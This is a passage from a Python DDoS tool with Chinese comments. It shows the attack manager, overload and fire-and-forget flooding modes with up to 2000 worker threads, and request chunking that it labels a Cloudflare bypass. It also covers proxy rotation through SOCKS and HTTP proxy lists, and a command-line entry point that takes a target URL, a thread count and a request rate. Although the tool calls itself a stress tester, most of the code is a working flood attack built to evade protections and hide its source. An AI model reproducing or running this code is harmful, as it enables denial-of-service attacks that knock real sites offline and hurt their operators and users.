                return False
            
            # 分片发送以模拟真实浏览器行为
            if self.config.cf_bypass and len(request) > 100:
                # 分成多个小块发送
                chunk_size = random.randint(50, 200)
                for i in range(0, len(request), chunk_size):
                    chunk = request[i:i+chunk_size]
                    socket_conn.send(chunk.encode('utf-8'))
                    if i + chunk_size < len(request):
                        time.sleep(0.001)  # 小延迟模拟真实行为
            else:
                socket_conn.send(request.encode('utf-8'))
            
            return True
            
        except Exception:
            return False
    
    def _generate_random_string(self, length: int = 20) -> str:
        """生成随机字符串"""
        chars = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def start_attack(self, mode: str, url: str, threads: int, rps: int, cookies: str = "") -> None:
        """启动攻击"""
        self.setup_logging()
        
        # 超负荷模式提示
        if self.config.fire_and_forget:
            self.logger.info(f"启动纯发送模式 {mode.upper()} 攻击: {url}")
        elif self.config.overload_mode:
            self.logger.info(f"启动超负荷模式 {mode.upper()} 攻击: {url}")
        else:
            self.logger.info(f"开始 {mode.upper()} 攻击: {url}")
        
        # 解析URL
        target, path, port, protocol = URLParser.parse(url)
        self.logger.info(f"目标: {target}:{port}, 路径: {path}, 协议: {protocol}")
        
        # 超负荷模式优化
        if self.config.overload_mode or self.config.fire_and_forget:
            self.logger.info("启用性能优化:")
            if self.config.fire_and_forget:
                self.logger.info("- 纯发送模式 (不接收响应)")
            if self.config.burst_mode:
                self.logger.info("- 爆发模式")
            if self.config.no_delay:
                self.logger.info("- 无延迟模式")
            if self.config.memory_aggressive:
                self.logger.info("- 内存激进模式")
                # 设置垃圾回收
                gc.set_threshold(700, 10, 10)  # 更激进的GC
        
        # 加载并检查代理
        self.proxy_manager.load_proxies()
        if len(self.proxy_manager.proxies) == 0:
            self.logger.warning("没有可用代理，将使用直连模式")
            # 设置直连模式
            self.config.proxy_type = "direct"
        
        self.running = True
        
        # 启动统计线程
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        
        # 启动内存管理线程
        if self.config.memory_aggressive:
            memory_thread = threading.Thread(target=self._memory_manager, daemon=True)
            memory_thread.start()
        
        # 超负荷模式使用更高效的线程管理
        if self.config.overload_mode or self.config.fire_and_forget:
            self._start_overload_attack(mode, target, path, port, protocol, threads, rps, cookies)
        else:
            self._start_normal_attack(mode, target, path, port, protocol, threads, rps, cookies)
    
    def _start_overload_attack(self, mode: str, target: str, path: str, port: int, protocol: str,
                              threads: int, rps: int, cookies: str = "") -> None:
        """启动超负荷模式攻击"""
        # 使用更大的线程池
        max_workers = min(threads * 2, 2000) if self.config.burst_mode else threads
        
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="AttackWorker") as executor:
            futures = []
            
            # 创建更多worker以提高并发
            worker_count = max_workers
            for i in range(worker_count):
                future = executor.submit(
                    self.attack_worker, mode, target, path, port, protocol, rps, cookies
                )
                futures.append(future)
            
            try:
                # 更频繁的状态检查
                while self.running:
                    time.sleep(0.1)
                    
                    # 超负荷模式下的动态调整
                    if self.config.burst_mode and len(futures) < max_workers:
                        # 动态添加更多worker
                        future = executor.submit(
                            self.attack_worker, mode, target, path, port, protocol, rps, cookies
                        )
                        futures.append(future)
                        
            except KeyboardInterrupt:
                self.logger.info("收到中断信号，正在停止超负荷攻击...")
                self.running = False
        
        # 清理资源
        self.connection_pool.cleanup()
        if self.config.memory_aggressive:
            gc.collect()
    
    def _start_normal_attack(self, mode: str, target: str, path: str, port: int, protocol: str,
                            threads: int, rps: int, cookies: str = "") -> None:
        """启动正常模式攻击"""
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                future = executor.submit(
                    self.attack_worker, mode, target, path, port, protocol, rps, cookies
                )
                futures.append(future)
            
            try:
                # 等待用户中断
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.logger.info("收到中断信号，正在停止攻击...")
                self.running = False
    
    def _memory_manager(self) -> None:
        """内存管理线程"""
        while self.running:
            try:
                # 强制垃圾回收
                gc.collect()
                
                # 每30秒清理一次连接池
                time.sleep(30)
                if self.connection_pool:
                    # 清理失效连接
                    for proxy_str, pool in list(self.connection_pool.pools.items()):
                        if pool.qsize() > self.config.max_connections_per_proxy // 2:
                            # 清理部分连接
                            for _ in range(pool.qsize() // 4):
                                try:
                                    conn = pool.get_nowait()
                                    conn.close()
                                except:
                                    break
                                    
            except Exception as e:
                self.logger.debug(f"内存管理错误: {e}")
                time.sleep(60)
    

    
def main():
    """主函数"""
    parser = argparse.ArgumentParser(
        description="优化版DDoS压力测试工具",
        epilog="使用示例: python3 main_optimized.py cc https://example.com 100 10"
    )
    
    parser.add_argument('mode', choices=['cc', 'get', 'post', 'head', 'check'], 
                       help="攻击模式")
    parser.add_argument('url', help="目标URL")
    parser.add_argument('threads', type=int, help="线程数")
    parser.add_argument('rps', type=int, help="每线程每秒请求数")
    parser.add_argument('--cookies', default="", help="Cookies")
    parser.add_argument('--proxy-file', default="socks5.txt", help="代理文件路径")
    parser.add_argument('--timeout', type=int, default=10, help="连接超时时间")
    parser.add_argument('--cf-bypass', action='store_true', help="启用Cloudflare绕过优化")
    parser.add_argument('--duration', type=int, default=0, help="运行时长(秒)，0表示不限制")
    parser.add_argument('--overload', action='store_true', help="启用超负荷模式")
    parser.add_argument('--fire-and-forget', action='store_true', help="纯发送模式(不接收响应)")
    parser.add_argument('--burst', action='store_true', help="爆发模式")
    parser.add_argument('--no-delay', action='store_true', help="无延迟模式")
    parser.add_argument('--max-connections', type=int, default=1000, help="最大连接数")
    parser.add_argument('--connections-per-proxy', type=int, default=50, help="每代理最大连接数")
    parser.add_argument('--proxy-type', choices=['socks5', 'socks4', 'http'], default='socks5', help="代理类型")
    parser.add_argument('--http-proxy-file', help="HTTP代理文件路径")
    
    args = parser.parse_args()

    # 创建配置
    config = Config(
        proxy_file=args.proxy_file,
        connection_timeout=args.timeout,
        cf_bypass=args.cf_bypass,
        overload_mode=args.overload,
        fire_and_forget=args.fire_and_forget,
        burst_mode=args.burst,
        no_delay=args.no_delay,
        connection_pool_size=args.max_connections,
        max_connections_per_proxy=args.connections_per_proxy,
        tcp_nodelay=args.overload or args.no_delay,
        disable_nagle=args.overload or args.no_delay,
        memory_aggressive=args.overload,
        proxy_type=args.proxy_type,
        http_proxy_file=args.http_proxy_file
    )
    
    # 创建攻击管理器
    attack_manager = AttackManager(config)
    
    if args.mode == 'check':
        # 仅检查代理
        target, _, port, protocol = URLParser.parse(args.url)
        attack_manager.proxy_manager.load_proxies()
        attack_manager.proxy_manager.check_proxies(target, port, protocol)
        print("代理检查完成")
    else:
        # 启动攻击
        attack_manager.start_attack(
            args.mode, args.url, args.threads, args.rps, args.cookies
        )
    

if __name__ == "__main__":
    main()
